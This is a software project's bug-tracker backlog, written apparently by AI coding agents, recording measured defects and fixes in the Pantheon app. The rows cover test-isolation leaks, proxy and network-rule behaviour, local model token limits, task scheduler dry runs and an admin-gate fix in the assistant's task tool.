- [x] **B1020** **Four `test_chat_helpers.py` cases fail when the file runs after a particular set of others.** Measured 2026-10-01 on `git archive 4e65b71` (pre-existing, not caused by `w5-docs`): running `test_the_agent_files_documents`, `test_a_person_s_agent_keeps_their_own_documents`, `test_a_document_is_found_by_the_name_you_gave_it`, `test_a_token_is_not_the_person_who_minted_it`, `test_api_token_user_route_gate`, `test_security_regressions`, `test_session_owner_attribution`, `test_review_regressions`, `test_kv_cache_invalidation_2927`, `test_owner_identity`, `test_privilege_fail_closed`, `test_auth_require_privilege_nondict` and then `test_chat_helpers` (`-p no:randomly`) fails `test_allowed_models_explicit_empty_restricted_list_blocks_all_models`, `test_allowed_models_nonempty_list_still_restricts_without_new_flag`, `test_specific_allowlist_blocks_models_outside_it` and `test_block_all_models_blocks_regardless_of_allowed_models_contents`; `test_chat_helpers` alone, or after any single one of those files, passes. So some state two or more of them leave behind (a cached module, a patched global, settings) reaches the allow-list check. Find what leaks and make the four cases set what they read. — found by `w5-docs` — **done 2026-10-01 (agent `w7-fixes`, `7027b3d`). The leak was in test code, not product code.** **Reproduced** on `f37de0f` with the row's exact list: 4 failed, 325 passed. **Found by module identity** (`id()` of `routes.chat_helpers`, `src.auth_helpers`, `core.auth` and the gate's own functions, taken after every test): `test_security_regressions::test_chat_preprocess_does_not_surface_cross_owner_attachment` popped `routes.chat_helpers` from `sys.modules` (at its start and again at its end) and never put it back; `test_review_regressions::test_normalize_thinking_handles_lowercase_thinking_process` then imported it again (`_import_without_mocks`, an ordinary import once the module is missing), which made a second copy and rebound it on the `routes` package; and `test_chat_helpers` patched `effective_user` by the dotted name `"routes.chat_helpers.effective_user"` — which pytest resolves through that package attribute, so onto the copy — while calling the `_enforce_chat_privileges` it imported at collection. The gate asked the real `effective_user`, found nobody, and returned: the four expecting a 403 failed, and the three expecting none passed without the gate ever looking. That is why it took two files: one to make the hole, one to fill it with a second copy. **Fixed at the leak**: the test drops both modules through the shared `tests/helpers/fresh_import.drop_for_fresh_import`, which restores `sys.modules` and the package attributes at teardown (`Law 14`). That exposed the same leak one module down: five `require_user` tests popped `src.auth_helpers` the same way, and `test_review_regressions::test_the_chat_privilege_gate_still_reads_the_real_effective_user` (`chat_helpers.effective_user is src.auth_helpers.effective_user`) had passed only because the stale copies were re-imported in a matching order — with only the first fix it failed. Those five go through the helper too (inside each test nothing changes: `from src import auth_helpers` reads the package attribute and never re-imported). The file's other unrestored pops are left as they were and filed (`B1049`). **And the cases set what they read**: the seven privilege cases in `test_chat_helpers.py` set `effective_user` in the gate's own globals (`_asking`), and the three that expect no refusal now assert the gate looked the user up. `Verify:` the row's command passes. `CI:` the row's 13-file order — **old tree 4 failed / 325 passed; new tree 330 passed**; each half alone is enough (the leak back with the cases fixed: green; the cases old with the leak fixed: green); the leak back with the cases patching the dotted name again: **7 failed** (the four, and the three that used to pass for nothing). New: `tests/test_security_regressions.py::test_the_tests_that_drop_a_module_put_it_back` runs both dropping tests under a `MonkeyPatch` of its own, undoes it, and checks `routes.chat_helpers`, `src.auth_helpers` and `src.chat_handler` (which the first re-imports under a stub `core.database`, and which the old code left on the `src` package as that stub-bound copy) are the modules that were there before — by `sys.modules`, by import and by package attribute; **it fails on the old tree** in a run of its own. **Mutation: 3 of 3 caught** on it: the `routes.chat_helpers` drop back to a bare pop; the first `src.auth_helpers` drop back to one; the shared helper restoring `sys.modules` but not the package attribute. — agent:`w7-fixes`

- [ ] **B1021** **`nc -u` to an address the workstation's network mode refuses is refused in silence.** Measured 2026-10-01 under the gate's real *internet* and *none* rules (a fresh network namespace, `netrules.ruleset`): OpenBSD netcat 1.226 (Ubuntu's) `echo hi | nc -u -w1 192.168.1.1 161` prints nothing and exits 0, with or without `-v` — the kernel's EPERM is swallowed. `B1011` explains a refused send from its output; here there is none, so nothing is said and an agent waiting on an SNMP or syslog reply reads silence as "nothing answered". Only the gate's own counters could tell it: a `counter` on the reject rules, read through the gate before and after the routed call (racy with a second call in flight — say so). `ping` under *internet* (an unprivileged ICMP socket, `B976`) is not measured either: neither this container nor the image ships it. `Verify:` under *internet*, a routed `bash` running that `nc -u` carries `B1011`'s sentence, measured on a real turn. — found by `B1011` — agent:`P20`

- [ ] **B1022** **51 module-level `httpx` calls still read `NO_PROXY` as httpx does.** `httpx.get(url)` builds a client inside and takes no `mounts=`, so `B1014`'s rule cannot reach it: `check-outbound.py` now counts them against `--max-env 51` (measured 2026-10-01; it may only go down). Among them are the LAN-facing ones a range matters most for: the model probes (`routes/model_routes.py` ×7, `src/model_context.py` ×3, `src/model_discovery.py` ×3, `src/chat_helpers._probe_lmstudio_models`, `llm_core.list_model_ids`), CardDAV (`routes/contacts/contacts_routes.py` ×6), STT/TTS, SearXNG. Fix: `paced_http.get_sync`/`get` (routed and paced), a file at a time, lowering `--max-env` as each lands. `Verify:` `--max-env 0`, or each one left named with its reason. — found by `B1014` — agent:`P16`

- [ ] **B1023** **`check-outbound.py` counts a function as paced when any call in it is.** Measured 2026-10-01 by `B1014`'s mutation run: reverting the Discord *Test* send in `routes/auth_routes.test_integration_route` to an unpaced `client.post` left the inventory unchanged, because the ntfy branch of the same function calls `paced_http.request`. The checker's own doc names the over-report (a helper paced by its caller) and argues against call-graph following; this is the under-report, inside one function. Fix: judge each outbound call by whether it **is** a pacing call or sits in the same branch/`with` block as an `acquire`, not by the enclosing function. `Verify:` that mutant raises the count by one. — found by `B1014` — agent:`P15`

- [ ] **B1024** **httpcore writes an IPv6 `CONNECT` authority without brackets.** Measured 2026-10-01 (httpx 0.28.1, httpcore 1.0.9): a request to `https://[fd00::5]:7040/` through an HTTP proxy sends `CONNECT fd00::5:7040 HTTP/1.1` — not a valid authority (RFC 9110 §7.2 wants `[fd00::5]:7040`); a strict proxy refuses it, a lenient one may split at the wrong colon. Pantheon only meets it for an IPv6 destination through an operator's proxy that `NO_PROXY` does not exempt. Upstream's to fix; worth knowing before telling an operator "IPv6 through your proxy works". `Verify:` the recorded `CONNECT` line names `[fd00::5]:7040`, or the limitation is said in `docs/setup.md`. — found by `B1013` — agent:`P16`

- [ ] **B1025** **Whether `host.docker.internal` reaches a service bound only to the host's loopback on Docker Desktop is asserted four times and measured nowhere.** `netagent/install.py` (`_container_reaches_host`), `netagent/server.py`'s docstring, `docs/setup.md` (Ollama must listen beyond loopback) and `.env.example` (the netagent block) all say it does not arrive on loopback; no measurement is cited, and reports of Docker Desktop's host networking differ on exactly this (estimated, not measured here). `B1012` therefore claims it neither way. Fix: measure on the owner's Docker Desktop 29.7.2 (`python3 -m http.server --bind 127.0.0.1 8765` on the host; `curl http://host.docker.internal:8765` from a container on the compose network) and correct whichever is wrong, with the date. `Verify:` the four places carry the measurement. — found by `B1012` — agent:`P17`

- [ ] **B1026** **In one process, the suite segfaults importing `onnxruntime` after ~850 test files.** Measured 2026-10-01 in this container (`/tmp/venv`, Python 3.11): the sorted prefix of `tests/` up to `B971`'s file crashed with *Fatal Python error: Segmentation fault* in `tests/test_retrieval_eval_measures_something.py::test_the_semantic_engine_is_scored_or_the_report_says_why` (`fastembed` → `onnxruntime/capi/_pybind_state.py` import), file 849 of 1,064; that case passes alone (1 passed, 6 s). Not bisected; it may be this container's onnxruntime build or thread state left by earlier files. A full-suite run in one process here therefore cannot finish. `Verify:` the sorted prefix runs past that file in one process, or the cause is named. — found by `B971`'s verification — agent:`integrator`

- [ ] **B1027** **`manage_settings` stores the nullable limits (`LIMIT_RANGES`) unvalidated.** Found while working `B931`. `B931` gave the agent's door the settings route's whole-number ranges; the route's *other* table, the nullable limits `P12-01` moved to `src.settings.LIMIT_RANGES` (byte caps, context budgets, files per request, the skills catalogue), it still does not read. Their shipped value is `None`, so `_coerce` returns whatever the model wrote. Measured on this tree: `set chat_upload_max_bytes abc` stores `"abc"` and replies *"Set chat_upload_max_bytes = abc."* — the resolver silently falls back to the built-in default while the panel shows `abc`; `set context_skill_index_chars 5` stores 5, below the route's floor of 200 (a catalogue heading with nothing under it, `P8-21`); `set upload_max_files_per_request -3` stores -3, which the resolver clamps to 1 with a log line. Not a security hole — the auth throttles in that table are `_SELF_RESTRAINT_KEYS` and refused — but the same "a stored number that is not the effective one" defect `B931` closed, on the sibling table. Fix: the route's nullable rule (`null`/blank → unset, a boolean refused, an integer clamped to `LIMIT_RANGES`) moved beside `clamp_int_setting` and read by both doors. `Verify:` `set chat_upload_max_bytes abc` is refused and `set context_skill_index_chars 5` stores 200 and says so. — found while working `B931`

- [ ] **B1028** **A run receipt still records a temperature or length the wire did not carry, on the native Anthropic path and for reasoning models.** Found while working `B933`, which fixed the local MiniMax profile only (the row's scope). Measured through `llm_call` with only the socket faked: `claude-3-5-sonnet` asked for 1.2 is receipted `{temperature: 1.2, max_tokens: 0}` and sent `{temperature: 1.0, max_tokens: 4096}` (the Anthropic ceiling and the builder's default length); `claude-opus-4-7` asked for 0.7 is receipted 0.7 and sent no temperature at all (`_anthropic_rejects_temperature`); `o3-mini` asked for 0.7 is receipted 0.7 and sent none (`_omit_temperature`), with its length under `max_completion_tokens`. Same `Law 10` claim as `B933` (*"the resolved configuration … caps applied"*). Fix: extend `_sent_sampling` (`src/llm_core.py`) — the Anthropic half can read `_build_anthropic_payload`'s own output, so it stays one rule. `Verify:` the receipt of a Nietzsche (1.2) chat on Claude shows 1.0. — found while working `B933`

- [x] **B1029** **The agent path sends `max_tokens: 1,000,000` to a local OpenAI-compatible server whenever a preset names a length — read, not measured, against vLLM.** `_resolve_local_lifts` lifts any non-zero preset `max_tokens` to `local_inference_max_tokens` (1,000,000 unless pinned), so Agent mode with Brainstorm, Reason or Code Analyze on a local endpoint sends 1,000,000 (measured at the payload, `B934`'s table). vLLM's OpenAI server validates `prompt + max_tokens <= max_model_len` and answers 400 when it is not — read from vLLM's source, **not measured here** (no vLLM in this environment). If it holds, Agent mode with a length-naming preset fails outright on a local vLLM while chat mode works. Measure against a real vLLM before acting; the fix, if it is real, belongs with `B934`'s decision (a ceiling derived from the endpoint's context window, or the setting's default lowered). `Verify:` an Agent-mode Brainstorm turn against a local vLLM answers. — found while working `B934` — **done 2026-10-01 (agent `w8-agent`, `49e9586`), within `D-2026-09-08-02` and `D-2026-10-01-04` — no new ruling.** **Read** (vLLM fetched from its repository for reading; none is installed here): `OpenAIServing._validate_input` refuses a request whose prompt plus `max_completion_tokens or max_tokens` exceeds `max_model_len` — the same rule at v0.6.6, v0.8.5, v0.10.1 and v0.11.0, a 400 `BadRequestError` before a token is generated, its message stating the window and the prompt's size. **Measured** through the real app against the showcase's scripted model served that way (`demo_model.DemoModel(max_model_len=32_768)`: `/v1/models` reports the window and a request over it gets vLLM's 400 and words; the prompt is counted at four characters a token — vLLM's rule over an approximate count): **Agent mode with Brainstorm sent 1,000,000, was refused, and the turn ended on the server's 400 with no reply**; no preset, and Chat mode with Brainstorm, answered. **The fix, and why it needs no ruling**: the refusal says what the server can serve, so the request is sent **once more asking for exactly `window − prompt`** — the number vLLM itself uses when no length is given (`llm_core.servable_max_tokens`, reading both of vLLM's wordings; the OpenAI-compatible stream path and `llm_call_async`). Only when the caller passes `max_tokens_floor` — the agent loop passes the preset's own number per candidate (beside `B1034`'s `max_tokens`) and on the force-answer salvage — and only when `floor ≤ servable < sent`. So it **never asks above what was sent** (the ceiling, typed or not, still bounds it — `D-2026-10-01-04`), **never below the preset** (`D-2026-09-08-02`'s floor: a window with less room than the preset fails as it did, and as Chat mode does — going below the preset is a call neither ruling makes, filed as its own row), never resends an unlifted request, and **never asks a server that took the number twice** — llama.cpp, Ollama and LM Studio see no change, and the 1,000,000 default stands. Not chosen: lowering the default (contradicts `D-2026-09-08-02`, which names it); a proactive clamp to the reported window minus an estimated prompt (changes what is sent to servers that accept the number, and rests on an estimate). **Cost, stated (`Law 10`)**: against a window-enforcing server every lifted request is refused once before it is answered — one extra request per Agent round, and vLLM logs each refusal with a traceback (`logger.exception("Error in preprocessing prompt inputs")`). **The receipt** (`P4-25`) records the turn's first request; when that one was resent, `_capture_run_config(resent=True)` writes one corrective row, so the receipt's `max_tokens` is the one the answer was generated under (still the one writer of `run_config`, `test_run_receipt`). `Verify:` an Agent-mode Brainstorm turn against a local vLLM answers. `CI:` `tests/test_a_local_vllm_is_asked_for_what_it_can_serve.py` — **15 cases** through the real app (`capture.Server`; every turn through `/api/chat_stream` into the real loop, wrapper and payload builders; a real socket to the scripted model): Brainstorm, Reason and Code Analyze each answer, resent at exactly `window − prompt` with the same messages and tools (3); the receipt says the resent number (1); the salvage (`llm_call_async`) is resent the same way and the turn does not end on the apology (1); a server that takes the number is asked once (1); a window with less room than the preset is not talked below it (1); a typed ceiling the window holds is sent once, and one it does not is talked down below it (1); and the rule over vLLM's two wordings and five refusals it must not act on (7). **13 fail on the old tree** (the two guards pass; 7 of the 13 are the rule's new name). **Mutation: 11 of 11 caught**: the stream path never resending 6; `llm_call_async` never resending 1; the preset not a floor 2; any status read as a length refusal 2; vLLM's older wording not read 1; asking for the window rather than window − prompt 10; the loop passing no floor 6; the salvage passing no floor 1; `stream_llm` dropping the floor 6; the receipt not corrected 1; the corrective row held by the first row's latch 1. — agent:`w8-agent`

- [ ] **B1030** **`set agent_max_rounds 0` means two different numbers depending on the cap it meets.** Found while working `B931`. `P7-12`'s gate reads a requested step cap through the chat route's reading of a *stored* value, where a falsy `0` is the default (`MAX_AGENT_ROUNDS`, 50); both doors now store a `0` as 1 (`B931`; the Settings page's own `clampInt` does the same). Measured: under a cap of 20, `set agent_max_rounds 0` raises the run to 50 and saves nothing; over a cap of 100 it is a lowering, saved as 1 — *"…0 is outside the range Settings allows (1 to 200), so it was clamped to 1"* — where before `B931` it stored 0, read as 50. Safe in direction (a lowering never needs a card) and said in the reply, but one request should not mean 50 to the gate and 1 to the writer (`Law 7`). Options: read the request through `clamp_int_setting` in `run_limits.loop_cap_request` (0 is always a lowering to 1), or refuse 0 for the step cap with a sentence (it is not a step limit, and a model may mean "unlimited", which is what 0 means for tool calls). `Verify:` `set agent_max_rounds 0` does the same thing under any saved cap. — found while working `B931`

- [ ] **B1031** **A teacher whose own model fails is saved twice.** Found by `B939`. When the teacher's request fails, its loop sends `agent_terminal` and returns without `[DONE]`; the route's terminal arm saves the reply (`_terminal_saved`), and `run_teacher_inline` then goes on — it may send `escalation_failed` — and the student's loop sends `[DONE]`, whose arm saves again: the `[DONE]` arm never looks at `_terminal_saved` (`routes/chat_routes.py`, agent branch). Measured through `/api/chat_stream` with the real `save_assistant_response` (the student's frames, a takeover, a teacher delta, the teacher's `agent_terminal`, `escalation_failed`, `[DONE]`): **two assistant messages saved**, both `failed: true`, the second with the `escalation_failed` note the first lacks — so a reload shows the reply twice, and run_post_response_tasks runs for a failed turn. A student's own failure is not affected (its loop returns before the teacher and before `[DONE]`). Fix: the `[DONE]` arm does not save a turn already saved at its terminal, and a note that arrives after that save is added to the saved reply (the `update-last-meta` path) rather than lost. `Verify:` a teacher whose model answers 502 leaves one reply after a reload, with its notes. — found by `B939` — agent:`w5-reload`

- [ ] **B1032** **A turn the teacher answered counts only the teacher's tokens in the session's totals.** Found by `B939`. `run_post_response_tasks` calls `accumulate_token_usage(session_id, last_metrics)` with the saved record, and `record_llm_round` writes one `llm_round` event from it; a turn the teacher answered is saved with the teacher's figures as the reply's (before `B939` the record was the teacher's alone; after it, the student's figures sit in `earlier_runs`), so the student's input and output tokens never reach `total_input_tokens`/`total_output_tokens` or the events table. Read, not driven. `B939` left the accounting exactly as it was on purpose (a change to the session's totals is not a reload question). Fix: accumulate each run's figures — the reply's and every `earlier_runs` entry's — and write one event per run. `Verify:` a takeover adds the student's tokens and the teacher's to the session's totals. — found by `B939` — agent:`w5-reload`

- [ ] **B1033** **The trim notice is saved with a chat turn and drawn by nothing after a reload, nor in a compare pane.** Found by `B953`. The same split `B953` and `B954` close for compaction, for the other shaping step: `P4-13` saves `context_trimmed` and its four `context_*_trim` figures on the turn's record (`_apply_shaping_metrics`), the live stream says *Context trimmed for this model (9/12 messages sent)* as a toast (`chat.js`), and nothing under `static/js` reads the saved keys (measured: no match for `context_trimmed` or `_before_trim` outside the live arm), and `compare/stream.js` has no `context_trimmed` arm. Fix: as `B953`/`B954` — a sentence builder beside `compactionNoticeText` that both the toast and a quiet line use, `addMessage` drawing it from the record, and a pane arm. `Verify:` a trimmed chat turn, reloaded, says so with the counts; a trimmed compare pane says so. — found by `B953` — agent:`w5-reload`

- [x] **B1034** **Agent mode hands every fallback candidate the local lift its primary got, a cloud one included.** Found while working `B934`, and measured through the real chat route, the real agent loop and the real fallback wrapper with only the socket faked: a local primary (`http://127.0.0.1:8080/v1`) that answers 503, with a cloud fallback, sends the cloud candidate `max_tokens: 1,000,000` with no ceiling typed and `32,768` with 32,768 typed — exactly what the local primary was sent. `_resolve_local_lifts` runs once per run from `endpoint_url` (the primary), and `stream_llm_with_fallback` is handed one `max_tokens` for every candidate; the loop's `_candidate_request` sets each candidate's own temperature (`B935`) but not its length. The reverse holds too: a cloud primary with a local fallback leaves the local candidate unlifted. Chat mode and `/api/chat` no longer do this (`B934`'s factory sets each candidate's own); a cloud provider given 1,000,000 typically refuses it, so the fallback fails exactly when it is needed. Fix: `_candidate_request` returns `max_tokens` per candidate through the same rule (`lift_cap` against `unlimited_for(is_local_endpoint(candidate_url))`), as `_chat_candidate_request_factory` now does. Not fixed in `B934`: that row's promise was that an install with no ceiling typed sends what it sent, and this changes what one sends. `Verify:` Agent mode on a local primary that is down, with a cloud fallback: the cloud request carries the preset's own `max_tokens`. — found while working `B934` — **done 2026-10-01 (agent `w7-fixes`, `0351d73`), on the call the integrator's brief carried under `D-2026-10-01-04`: a cloud fallback gets the preset's own length, never the local lift; a local fallback behind a cloud primary gets the local lift.** **Measured first** (`Law 3`), on `f37de0f` through the real route, loop and wrapper with only the sockets faked, Brainstorm (4096): local primary down → cloud fallback sent 1,000,000 → 1,000,000 untyped and 32,768 → 32,768 typed; cloud primary down → LAN fallback sent 4096 → 4096 both ways; no preset, unset everywhere — the row holds in both directions. **One rule, two askers (`Law 7`)**: the token arm of `_resolve_local_lifts` is now `_lift_max_tokens(max_tokens, unlimited=…)` — `lift_cap(preset, _local_max_tokens_ceiling(), pinned=False)`, the agent path's rule unchanged — and `candidate_max_tokens(preset, url)` asks that same function with `unlimited=run_is_unlimited(url)`, the product's one "is this local" (`B929`; `unlimited_for(is_local_endpoint(url))`). `stream_agent_loop` keeps the preset's own number (`_preset_max_tokens`) before the run's lift, and `_candidate_request` sets `max_tokens: candidate_max_tokens(_preset_max_tokens, candidate_url)` beside `B935`'s temperature, through the `kwargs` the wrapper already merges over the run's. So each candidate is sent what it would have been sent as the primary: the primary's payload is unchanged (`B934`'s 68 cases, its untouched-install byte comparison included, pass unedited), and a pinned fallback in a later round — candidate 0 then — gets its own number too (read, not measured). **What an untyped install now sends differently, as the call says**: a cloud fallback behind a local primary, the preset's number instead of 1,000,000; a local fallback behind a cloud primary, 1,000,000 instead of the preset's — the agent path's own untyped lift, so `B1029`'s question (1,000,000 to a local vLLM) now reaches a local *fallback* exactly as it already reached a local primary, and that row's fix covers both. A typed 0, `PANTHEON_UNLIMITED_LOCAL=0` and a preset above the ceiling behave per candidate as they did for the run; `PANTHEON_FORCE_UNLIMITED=1` still lifts every candidate (the operator's switch for every endpoint). The chat doors are untouched — `local_door_max_tokens` is their own rule (no lift unless typed), which `B934` decided. `tests/test_local_max_tokens_ceiling.py::test_the_number_is_no_longer_a_literal_in_the_loop` read `_resolve_local_lifts`' source for `_local_max_tokens_ceiling()`; it now follows the arm into `_lift_max_tokens` (the literal still absent from both). `Verify:` Agent mode with Brainstorm on a local primary that is down and a cloud fallback: the cloud request carries `max_tokens: 4096`; swap them (cloud primary down, local fallback) and the local request carries 1,000,000, or the ceiling typed in Settings › Agent Tools › *Local reply ceiling*. `CI:` `tests/test_an_agent_fallback_is_sent_its_own_length.py` — **17 cases**, an Agent-mode turn through the real chat route, the real agent loop, the real fallback wrapper and the real payload builders, the primary answering 503 (`B935`'s `wire`, the same harness as `B934`'s agent door; the other socket an agent turn opens, the context-window query per candidate, `model_context._query_context_length`, faked too): the row in both directions, untyped and typed (4); two local, two cloud, no preset, a typed 0, a preset above the ceiling (5); the lift switched off (1); the force switch (1); a local MiniMax fallback with no preset still filled by `B934`'s profile (1); and per URL (five shapes), the candidate's number equal to `_resolve_local_lifts`' own answer for that URL across four ceilings × three presets (5). **9 fail on the old tree** — 5 because `candidate_max_tokens` is new; with the name present and the old behaviour put back, **4 of 17 fail** (the 13 that pass are the guards and the one-rule cases). **Mutation: 8 of 8 caught** (of 17): the old behaviour 4; the candidate asked about the primary's URL 4; lifted from the run's already-lifted number 2; never lifted 9; always lifted 8; a ceiling of its own (a copy) 7; ignoring the lift switches 2; the preset not a floor 1. — agent:`w7-fixes`

- [x] **B1035** **The library's AI tidy marks every document it reviews as edited just now.** Found while working `B1019`, measured through the real `POST /api/documents/ai-tidy` with only the model's reply faked: two documents last edited 2025-01-02, both judged "keep", come back with `updated_at` = the moment of the tidy, so they jump to the top of the library's default sort and read "edited just now". The route writes `doc.tidy_verdict = "keep"` through the ORM, and `updated_at` is `TimestampMixin`'s `onupdate` column — the exact report `document_folders`' header records filing used to make ("a reorganisation reported as twenty edits"), which `_refile` fixes by writing `updated_at` back to itself; `B1019`'s `remember_kept` does the same. Fix: the same UPDATE in `ai_tidy_documents` for the `keep` verdict (the `junk` rows are deleted). `Verify:` run the library's AI tidy over documents it keeps; their "edited" times do not move. — found while working `B1019` — **done 2026-10-01 (agent `w7-fixes`, `a886da8`).** **Measured first** (`Law 3`), on `f37de0f` through the real route: the row holds, and the library's own list (`GET /api/documents/library`, default sort) then showed every document the tidy kept as edited at the moment of the tidy. **One writer (`Law 7`)**: `document_actions.write_tidy_verdict(db, doc, verdict)` — the UPDATE that writes `updated_at` back to itself, `_refile`'s shape — is now how a tidy verdict is written: the AI tidy's `keep` (any answer but "junk", as before) and `B1019`'s `remember_kept`, whose inline copy of the same UPDATE it replaces; two writers of one column cannot drift into two answers to "is a review an edit". The junk branch is unchanged (those rows are deleted), and so is what the AI tidy skips (any row with a verdict, the person's `kept:` mark included). `B1019`'s header in `src/document_actions.py` and one docstring in `tests/test_a_kept_document_stays_kept.py` said the AI tidy's verdict write moves `updated_at`; both now say it did, until this row (the digest reasoning there stands — a rename still moves it). `Verify:` run the library's AI tidy over documents it keeps; their "edited" times do not move and the library's order is the same before and after. `CI:` `tests/test_a_document_the_ai_tidy_keeps_is_not_edited.py` — **6 cases** through the library's real routes on `B1006`'s real SQLite harness with only the model's reply faked (it answers by title): two documents kept keep their own times — one of them edited a month after it was made, so "its own" is not its creation time — and their content; the library reads the same, order and times, after a tidy that kept three; an odd or empty answer is a keep and not an edit; junk still removed and the rest unmoved; the verdict still remembered (the next tidy asks nothing); a document already reviewed (the AI's `keep`, the person's `kept:`) untouched and unasked. **5 fail on the old tree** (the one that passes is the "still remembered" guard). **Mutation: 7 of 7 caught**: the route's keep back through the ORM 5 (of 6); the keep writing nothing 5; another verdict written 4; and, with `B1019`'s 14 cases beside these (of 20), the writer moving `updated_at` 12; writing back the creation time 1; writing no verdict 13; `remember_kept` back on the ORM 7. — agent:`w7-fixes`

- [x] **B1036** **A dry run of a paused task plans nothing, says the task is "no longer active", and notifies.** `_execute_task_locked` returned at its `status != "active"` check before the dry branch: a dry run of a paused task recorded `skipped` with "Task no longer active (status=paused)", left `result` at "Queued — waiting for a free slot…" and notified; an admin-only task of a non-admin owner reaching the dry path was paused and its `last_run` moved (`record_admin_refusal`). — found by `P22-04` — agent:`wb-graph`, and separately by `wb-fields` — **done 2026-10-01 (`01efdb0`, agent `wb-runs`).** The dry branch now comes first. `dry_run_declined` names the only two things a dry run will not plan — the task is gone, or its action is one the engine would refuse this owner (the same sentence, so the dry path is still not a way to read an admin-only command) — recorded as a `skipped` run whose `error` says why, with no pause, no schedule moved and nobody told; everything else is planned through `dry_run_lines`, one planner, whose last line for a task that is not active says *"It is paused, so a real run would not start it."* (or *"It was a one-off and has already run, …"*, from `NOT_ACTIVE_WORDS`). A real run of a paused task is unchanged — `skipped`, and told (`B112`) — except that its `result` carries the reason rather than the creation placeholder History showed. The two tests that pinned "a paused task is declined" (`test_the_agent_can_ask_what_a_task_would_do.py`, `test_show_me_what_this_would_do_js.py`) keep their point with the decline that remains (the privilege gone between a door's check and the engine's). `Verify:` `tests/test_a_switched_off_task_can_be_dry_run.py` — 13 cases on the real scheduler, route, tool and SQLite; **10 of 13 fail on the previous tree** (3 `Law 1` guards pass). **Mutation, 6 of 6 caught** (the dry branch back below the not-active return reddens 6 across the three dry-run files; the admin rule dropped 2; a declined dry run pausing 2 or notifying 2; the plan not saying paused 4; the stale placeholder kept 1). Driven in Chromium (both widths, both palettes): *Message me* paused, *Show me what this would do* drew the plan ending "It is paused, so a real run would not start it.", and no notification toast followed.

- [x] **B1037** **A chain into a paused task says it continued.** `_advance_chain` wrote "Continued to X" when X was paused; X then recorded a `skipped` run and a `skipped` notification. — found by `P22-01` — agent:`wb-graph` — **done 2026-10-01 (`f9651a8`, agent `wb-runs`).** Re-measured on the real chain path. The predecessor's line now reads *"Did not continue to X: it is paused"* (for a spent one-off, "…: it was a one-off and has already run"), from the `NOT_ACTIVE_WORDS` the dry run's plan uses. **X's own record is `B112`'s notification-policy call, as the row says, and is left exactly as it was**: X is still handed on, records its `skipped` run ("Task no longer active (status=paused)") and is told — held by a test as it stands, for whoever answers that question. `Verify:` `tests/test_a_chain_into_a_paused_task_says_so.py` — 5 cases on the real `_execute_task_locked` → `_advance_chain` → `_run_chained` path; **3 of 5 fail on the previous tree** (2 `Law 1` guards pass). **Mutation, 3 of 3 caught.** Driven in Chromium: with *Message me* paused, Run now on *Nightly backup* ended "Did not continue to Message me: it is paused".

- [x] **B1038** **`manage_tasks` `create` and `run` skip the admin gate the route applies, and report success.** — found by `P22-04` — agent:`wb-graph` — **done 2026-10-01 (`22d2b03`, agent `wb-runs`). Re-measured, and wider than written.** With `owner_has_admin_task_privileges` answering False: `create` of `ssh_command` stored the task ("Created task 'reboot'"); `edit` switched a task's action to `ssh_command`; `resume` put a refused task back on; `run` said "triggered" and reached the scheduler — exit 0 each time, where the route refuses all four (403). No command ran (the engine's gate holds, `FORBIDDEN.md` Part 2). `_admin_refusal` asks `src.task_action_policy` the route's question at all four doors — for an edit, about the type and action the task would have after it — and answers with the route's sentence before anything is written or dispatched; `dry_run`'s inline copy now calls it (`Law 7`). Pause stays open; an admin, and a non-admin's ordinary tasks, are answered as before. `Verify:` `tests/test_the_assistant_asks_the_admin_gate_first.py` — 11 cases, the real tool on a real SQLite file and the real route through `TestClient` (the tool's refusal equals the route's 403 detail); **6 of 11 fail on the previous tree** (5 `Law 1` guards pass). **Mutation, 6 of 6 caught** (create unguarded 3; edit asking about the old action 1; resume unguarded 1; run unguarded 1; the gate refusing everyone 10; dry_run unguarded 1).

- [ ] **B1039** **The form states four server numbers as copies, because nothing serves them.** `static/js/tasks/taskFields.js` writes the time limit's 30 s / 24 h (`MIN_/MAX_TASK_TIMEOUT_SECONDS`) and retries' 10 (`_validate_execution_settings`), so it can refuse in words before the request; the server stays the judge and its refusal is shown. The retry sentence says only "about twice as long as the one before", because `FAILURE_BACKOFF_BASE_SECONDS` (300) and `FAILURE_BACKOFF_CAP_SECONDS` (6 h) are on no wire, and `P8-32`'s Verify wants gaps "they were told about". Serving `{timeout: {min, max}, retries: {max, first_gap_seconds, cap_seconds}}` beside `default_trigger_count` on `/meta/actions` (`routes/task/**`, wb-graph's) would let the form read all of them and say "the first retry waits about 5 minutes" (`Law 7`). — found by `P22-03` — agent:`wb-fields`

- [ ] **B1040** **A task linked to a crew member is shown and saved on the browser's clock, while the server reads it on the crew member's.** `_resolve_task_timezone` is task → crew member → none (`P8-32`). The form has no crew field. For a crew-linked task with no zone of its own, the form shows "Not set: … kept in UTC" and converts the browser's clock to UTC, and the card converts UTC to the browser's clock, while the scheduler fires it at that `HH:MM` in the crew member's zone. This predates `P22-03`, which keeps "no zone" exactly as it was (`Law 1`). `_task_to_dict` serves `crew_member_id` but not the resolved zone; serving `effective_tz` (or the crew member's zone) would let the form say "Not set: this task follows <crew member>'s zone, Europe/Paris" and show the time on that clock. `Verify:` a crew-linked 09:00 task reads 09:00 on its card in the crew member's zone. — found by `P22-03` — agent:`wb-fields`

- [ ] **B1041** **Two task forms open at once share ids, so a `<label for>` in the second focuses the first.** `P22-03` makes the two forms independent where it matters: every lookup is inside the form's host, which a test pins. But ids are document-wide to the browser, so `<label for="task-form-tz">` and its siblings in the Workbench panel point at the Tasks window's field when both are open. That is an accessibility papercut, not data loss. Fixing it means per-mount ids, which every test and both mounts key on, so it is a contract change for `wb-canvas` and the integrator to weigh rather than a quiet edit. — found by `P22-03` — agent:`wb-fields`
  **Weighed and deferred 2026-10-01 (agent `wb-polish`).** Measured in Chromium with the Tasks window's Edit form and the Workbench's panel open on one task: the Workbench's markup is static and comes first in the document, so **the Tasks window's form is the one that misfires** — its *Time zone*, *Retry* and *Time limit* labels focus the Workbench's fields, and its own fields have **0** labels. Per-mount ids are the fix that also ends the duplicate ids, and they are the contract change this row says they are: 38 ids, 63 host-scoped lookups, every form test and the notes' browser selectors key on `#task-form-*`. And the gap is wider than this row: **16 of the form's 20 labels have no `for` at all** (filed), so most fields have no accessible name with one form open — the same change should tie all 20. An interim that moves no id is possible (each `label[for]` tied to its own field by a per-mount `aria-labelledby`, and its click redirected inside the host) and is about 25 lines; not done, so the integrator can choose between the two.

